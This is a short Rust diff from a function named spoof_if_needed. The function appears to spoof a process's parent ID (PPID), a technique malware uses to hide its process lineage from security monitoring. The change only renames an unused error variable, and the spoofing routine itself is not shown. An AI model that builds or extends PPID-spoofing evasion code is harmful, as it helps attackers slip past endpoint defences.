@@ -29,8 +29,8 @@ pub unsafe fn spoof_if_needed() {
     };
     match spawn_with_parent(pid) {
         Ok(()) => std::process::exit(0),
-        Err(e) => {
-            dbg_log!("[!] ppid: spawn failed: {e}, continuing without spoof");
+        Err(_e) => {
+            dbg_log!("[!] ppid: spawn failed: {_e}, continuing without spoof");
         }
     }
 }
